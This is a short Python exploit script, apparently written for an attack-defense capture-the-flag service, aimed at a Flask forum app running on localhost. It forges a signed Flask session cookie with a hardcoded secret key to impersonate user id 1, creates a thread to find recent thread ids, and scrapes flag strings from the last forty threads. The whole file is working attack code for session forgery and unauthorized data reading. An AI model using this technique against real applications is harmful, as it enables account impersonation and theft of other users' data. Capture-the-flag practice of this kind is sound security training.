#!/usr/bin/env python3

import sys
import requests
import hashlib
import re
from random import choice
from flask import Flask
from flask.sessions import SecureCookieSessionInterface


alph_full = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
alph_caps = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
names = ['goliath', 'royal', 'dacota', 'marry', 'hunter', 'twilight' ,'smile' ,'castle', 'lucky', 'wolf']
FlagRegExp = re.compile(r'[A-Za-z0-9]{31}=')

#ip = sys.argv[1]
ip = '127.0.0.1'
port = '5000'
host = f'{ip}:{port}'


def id_gen( size = 10, first = names, next = alph_full ):
	beg = choice(first)
	return  beg + ''.join(choice(next) for i in range(size - len(beg)))


def main():

	flags = ""

	u_name = "smile6IYXB"#id_gen(next=alph_caps)
			
	sess_str = get_session( {"id":1, "login":u_name}, "gk2ptgp9mB" )

	threads = threads_id( sess_str )
	last_id = int( threads[len(threads)-1] )

	for t_id in range(last_id - 40, last_id):

		for flag in view_thread( sess_str , t_id ):
			flags += flag + "\n"

	print( flags, flush=True )


def get_session(data, secret_key):
    """Get session with data stored in it"""
    app = Flask("sploit")
    app.secret_key = secret_key

    session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

    return session_serializer.dumps(data)


def threads_id( s ):
	#http://127.0.0.1:5000/create | POST | name=Name
	data = requests.post(f'http://{host}/create', data={"name":"SuperUsers'sNews"}, cookies={"session":s}).text
	return  re.findall( "/threads/(\d+)", data )


def view_thread( s, t_id ) -> list:
	#http://127.0.0.1:5000/threads/5 | GET
	data = requests.get( f'http://{host}/threads/{t_id}', cookies={"session":s}).text#, data={"text":flag} )
	return  FlagRegExp.findall( data )


if __name__ == '__main__':
	main()